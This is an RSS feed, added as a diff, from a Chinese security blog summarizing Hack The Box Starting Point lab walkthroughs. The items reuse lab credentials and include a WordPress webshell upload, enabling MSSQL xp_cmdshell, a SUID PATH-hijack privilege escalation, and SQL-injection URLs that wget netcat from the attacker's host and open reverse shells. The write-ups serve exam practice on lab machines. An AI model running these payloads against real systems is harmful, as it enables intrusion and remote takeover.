@@ -1,0 +1,158 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>靶场 on F0rmat&#39;Blog</title>
+    <link>https://getshe11.com/categories/%E9%9D%B6%E5%9C%BA/</link>
+    <description>Recent content in 靶场 on F0rmat&#39;Blog</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Sat, 19 Dec 2020 00:20:00 +0000</lastBuildDate><atom:link href="https://getshe11.com/categories/%E9%9D%B6%E5%9C%BA/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Hackthebox-Pathfinder</title>
+      <link>https://getshe11.com/posts/pathfinder/</link>
+      <pubDate>Sat, 19 Dec 2020 00:20:00 +0000</pubDate>
+      
+      <guid>https://getshe11.com/posts/pathfinder/</guid>
+      <description>0x00 前言 前面的所有密码：
+  Archetype：
+Mssql:M3g4c0rp123
+Administrator:MEGACORP_4dm1n!!
+  Oopsie
+Mysql:M3g3C0rpUs3r!
+ftp:mc@F1l3ZilL4
+  Vaccine
+Zip:741852963
+Web:qwerty789
+postgres:P@s5w0rd!
+  Shield
+domain：Sandra：Password1234!
+  0x01 过程 1、信息收集 nmap收集信息：
+可以看到开放了88（kerberos）、389（ldap）、3268（全局编录端口），可以判断着一台可能是域控（Domain controller）。
+既然在上一台靶机获得了域用户的账号密码，那就用来登陆这一台主机看看，首先用的是Psexec工具，在kali上面Impacket工具已经包含了这个脚本Psexec.py
+语法是：
+psexec.py [[domain/] username [: password] @] [Target IP Address]
+很奇怪，登陆了居然是system，那下面就不用打下去了～
+应该是共享靶机的问题吧，那先按正常流程走一遍，之前我也用这种方式登陆过，但是也出现了认证的错误。
+遇到域我已经大半年没有搞过技术了，有点生疏，顺便复习了一遍，写了一篇笔记： https://getshe11.com/2020/12/16/Domain-security/
+我看了walkthrough里面一开始就使用bloodhound去枚举域信息，收集域信息，看下有哪些账户是存在配置缺陷之类的，想了解一下bloodhound是什么可以看官方文档： https://bloodhound.readthedocs.io/en/latest/index.html
+安装地址： https://github.com/fox-it/BloodHound.py
+为什么要用python版本的bloodhound？因为我们直接用psexec是登陆不上去的，而且也没有开3389端口，也就你无法放exe和ps1的脚本放上去执行
+GitHub主页也没什么使用方法，直接命令-h查看参数：
+usage: bloodhound-python [-h] [-c COLLECTIONMETHOD] [-u USERNAME] [-p PASSWORD] [-k] [--hashes HASHES] [-ns NAMESERVER] [--dns-tcp] [-d DOMAIN] [-dc HOST] [-gc HOST] [-w WORKERS] [-v] [--disable-pooling] Python based ingestor for BloodHound For help or reporting issues, visit https://github.</description>
+    </item>
+    
+    <item>
+      <title>Hackthebox-Shield</title>
+      <link>https://getshe11.com/posts/shield/</link>
+      <pubDate>Mon, 07 Dec 2020 22:17:00 +0000</pubDate>
+      
+      <guid>https://getshe11.com/posts/shield/</guid>
+      <description>0x01 前言 根据hackthebox的惯性，我在这里收集了前面的所有密码：
+  Archetype：
+Mssql:M3g4c0rp123
+Administrator:MEGACORP_4dm1n!!
+  Oopsie
+Mysql:M3g3C0rpUs3r!
+ftp:mc@F1l3ZilL4
+  Vaccine
+Zip:741852963
+Web:qwerty789
+postgres:P@s5w0rd!
+  0x02 过程 信息收集 Getshell 看到只有两个端口：80、3306，3306我尝试了连接，发现不给外链，那入口就应该在80端口，打开是一个iis默认的页面
+开dirbuster进行目录扫描，发现是一个wordpress程序：
+看到是wp中间散发了挺多思路的，首先是使用wpscan进行插件、主题漏洞扫描，之后是枚举用户密码。
+后来发现wp的版本是大于5.0的，很多漏洞都不能利用了，尝试密码大法最终使用**P@s5w0rd!**成功登陆了后台：
+编辑主题：http://10.10.10.29/wordpress/wp-admin/theme-editor.php?file=search.php&amp;amp;theme=twentysixteen
+修改了search.php的内容为我们的冰蝎php马：
+一句话地址：http://10.10.10.29/wordpress/wp-content/themes/twentysixteen/search.php
+用冰蝎命令执行没有交互式，有交互式的虚拟终端太卡了。还是上msf吧：
+msf &amp;gt; use exploit/unix/webapp/wp_admin_shell_upload msf &amp;gt; set PASSWORD P@s5w0rd! msf &amp;gt; set USERNAME admin msf &amp;gt; set TARGETURI /wordpress msf &amp;gt; set RHOSTS 10.10.10.29 msf &amp;gt; run 使用msf的shell还是不好用，毕竟是根据webshell来建立连接的：
+还是直接上nc，使用刚才在冰蝎上传的nc.exe:
+execute -f nc.exe -a &amp;quot;-e cmd.exe 10.10.14.33 1234&amp;quot;</description>
+    </item>
+    
+    <item>
+      <title>Hackthebox-Archetype</title>
+      <link>https://getshe11.com/posts/archetype/</link>
+      <pubDate>Sun, 06 Dec 2020 15:30:00 +0000</pubDate>
+      
+      <guid>https://getshe11.com/posts/archetype/</guid>
+      <description>0x01 前言 挺久没接触技术，最近准备考OSCP，就先拿Hack The Box里面的题目先练练手。
+这个靶机是Starting Point Lab的机器Archetype，收获还是挺多的，记录一下。
+0x02 过程 拿到ip先上nmap：
+我刚开始扫的时候还没有3389这个端口，应该是free的共享靶机，大家都可以用的，穷啊～
+看到445可以用smb工具来连接查看下有什么共享信息：
+尝试了下面的共享只有backups这个disk可以进去，里面还有一个配置文件，直接get下来看看有什么：
+看到了mssql的连接信息，应该就是对应nmap扫描出来的1433端口：
+但这里出现了一个问题，靶机是共享的，1433端口被搞坏了。。。：
+剩下的具体可以看下这篇文章：https://medium.com/@dpgg/hackthebox-archetype-starting-point-391af7b10fea
+0x03 总结 1、smbclient命令
+smbclient(选项)(参数)
+-B&amp;lt;ip地址&amp;gt;：传送广播数据包时所用的IP地址； -d&amp;lt;排错层级&amp;gt;：指定记录文件所记载事件的详细程度； -E：将信息送到标准错误输出设备； -h：显示帮助； -i&amp;lt;范围&amp;gt;：设置NetBIOS名称范围； -I&amp;lt;IP地址&amp;gt;：指定服务器的IP地址； -l&amp;lt;记录文件&amp;gt;：指定记录文件的名称； -L：显示服务器端所分享出来的所有资源； -M&amp;lt;NetBIOS名称&amp;gt;：可利用WinPopup协议，将信息送给选项中所指定的主机； -n&amp;lt;NetBIOS名称&amp;gt;：指定用户端所要使用的NetBIOS名称； -N：不用询问密码； -O&amp;lt;连接槽选项&amp;gt;：设置用户端TCP连接槽的选项； -p&amp;lt;TCP连接端口&amp;gt;：指定服务器端TCP连接端口编号； -R&amp;lt;名称解析顺序&amp;gt;：设置NetBIOS名称解析的顺序； -s&amp;lt;目录&amp;gt;：指定smb.conf所在的目录； -t&amp;lt;服务器字码&amp;gt;：设置用何种字符码来解析服务器端的文件名称； -T&amp;lt;tar选项&amp;gt;：备份服务器端分享的全部文件，并打包成tar格式的文件； -U&amp;lt;用户名称&amp;gt;：指定用户名称； -w&amp;lt;工作群组&amp;gt;：指定工作群组名称。 连接服务器smbclient //192.168.0.1/tmp -U username%password
+2、mssql开启xp_cmdshell
+EXEC sp_configure &amp;#39;Show Advanced Options&amp;#39;, 1;	\\使用sp_configure系统存储过程，设置服务器配置选项，将Show Advanced Options设置为1时，允许修改数据库的高级配置选项 reconfigure;	\\确认上面的操作 sp_configure;	\\查看当前sp_configure配置情况 EXEC sp_configure &amp;#39;xp_cmdshell&amp;#39;, 1	\\使用sp_configure系存储过程，启用xp_cmdshell参数，来允许SQL Server调用操作系统命令 reconfigure;	\\确认上面的操作 xp_cmdshell &amp;#34;whoami&amp;#34; \\在靶机上调用cmdshell执行whoami 3、使用mssql的xp_cmdshell反弹shell</description>
+    </item>
+    
+    <item>
+      <title>Hackthebox-Oopsie</title>
+      <link>https://getshe11.com/posts/oopsie/</link>
+      <pubDate>Sun, 06 Dec 2020 12:53:00 +0000</pubDate>
+      
+      <guid>https://getshe11.com/posts/oopsie/</guid>
+      <description>0x01 前言 做完Archetype继续来做Oopsie
+0x02 过程 Scan Port： Getshell 开启burp suite浏览网站，发现后台：
+使用Archetype实验获取到的密码MEGACORP_4dm1n!! 登陆成功：
+上传功能要超级管理员才可以上传，使用Accout页面的功能枚举账号：
+使用burpsuite的intruder功能进行爆破：
+访问上传页面拦截并修改cookie的user参数：
+成功显示上传界面：
+编写kali自带的php-reverse-shell.php，文件在/usr/share/webshells/php，把信息修改成监听的机子：
+监听端口，等待连接：
+上传php文件：
+但是找不到上传后的文件地址，使用kali自带的dirbuster对网站进行扫描：
+找到uploads文件，尝试把上传的文件名放在uploads访问，已经反弹成功：
+Privilege Escalation 读取web应用下的db.php文件获取到数据库连接信息：
+登陆robert用户，因为还不是交互式的shell，可以使用命令SHELL=/bin/bash script -q /dev/null :
+看到robert用户属于两个组，看下bugtracker有s权限，能使用root的权限执行：
+输入id，可以看到它是使用cat读取root目录的文件信息：
+我们可以使用改变当前目录的path值，当前用户执行bugtracker程序是会优先使用当前的path变量：
+然后在tmp目录下写入一个cat，程序会先执行这个cat，cat的内容是/bin/bash，执行后会以root形式执行 /bin/bash /root/reports/：
+执行成功后：
+0x03 总结 1、还是要细心为主
+2、关于文中为什么可以用bugtracker来提权为root，可以参考以下两个链接：
+ 关于Linux下s、t、i、a权限：https://www.cnblogs.com/qlqwjy/p/8665871.html
+LINUX s权限位提权：http://www.361way.com/suid-privilege/5965.html
+ 3、过程有一个设置path的知识点
+robert@oopsie:/$ export PATH=/tmp:$PATH robert@oopsie:/$ cd /tmp robert@oopsie:/tmp$ echo &#39;/bin/bash&#39; &amp;gt; cat robert@oopsie:/tmp$ chmod +x cat  export PATH=/tmp:$PATH export是设置环境变量，这条语句设置PATH的变量，/tmp:$PATH 的$PATH代表原本的PATH变量，把/tmp加到这边变量的前面
+4、提权到root发现cat用不了，因为我们已经改变了cat为/bin/bash,可以使用more、xxd等命令查看文件内容</description>
+    </item>
+    
+    <item>
+      <title>Hackthebox-Vaccine</title>
+      <link>https://getshe11.com/posts/vaccine/</link>
+      <pubDate>Sat, 05 Dec 2020 00:44:00 +0000</pubDate>
+      
+      <guid>https://getshe11.com/posts/vaccine/</guid>
+      <description>0x01前言 hackthebox练习
+0x02 过程 首先直接nmap ：
+发现只有三个端口，根据上一台Oopsie靶机最后给的信息
+ftpuser / mc@F1l3ZilL4
+直接登陆ftp，里面有个备份文件的压缩包：
+但是解压需要密码，可以使用zip2john工具，是john包含的一款把zip转换成john能破解的工具：https://github.com/openwall/john
+zip2john ~/backup.zip &amp;gt; hash
+使用john破解：
+John hash
+查看解压的index.php文件：
+从代码逻辑看得出来只要username等于admin且密码等于密码md5加密过后的值，解密2cb42f8734ea607eefed3b70af13bbd3
+使用该密码登陆80端口的web应用：
+存在sql注入：
+使用sqlmap跑，但是不能执行&amp;ndash;os-shell，官方的可以，可能是网络的问题，进行sql 查询的时候就特别卡
+网上介绍https://www.aldeid.com/wiki/HackTheBox-StartingPoint-Vaccine
+可以用python脚本vaccine.py
+https://github.com/florianges/-HTB-Vaccine_sql_injection
+发现执行不成功，可能还是网络问题，还是乖乖放浏览器执行吧
+http://10.10.10.46/dashboard.php?search=a&#39;;DROP TABLE IF EXISTS cmd_31554; -- - http://10.10.10.46/dashboard.php?search=a&#39;;CREATE TABLE cmd_31554(cmd_output text); -- - http://10.10.10.46/dashboard.php?search=a&#39;;COPY cmd_31554 FROM PROGRAM &#39;wget -P /tmp/31554 http://10.10.14.33:80/nc&#39;; -- - http://10.10.10.46/dashboard.php?search=a&#39;;COPY cmd_31554 FROM PROGRAM &#39;chmod 777 /tmp/31554/nc&#39;; -- - http://10.10.10.46/dashboard.php?search=a&#39;;COPY cmd_31554 FROM PROGRAM &#39;/tmp/31554/nc 10.10.14.33 4444 -e /bin/bash&#39;; -- - 反弹成功：</description>
+    </item>
+    
+  </channel>
+</rss>
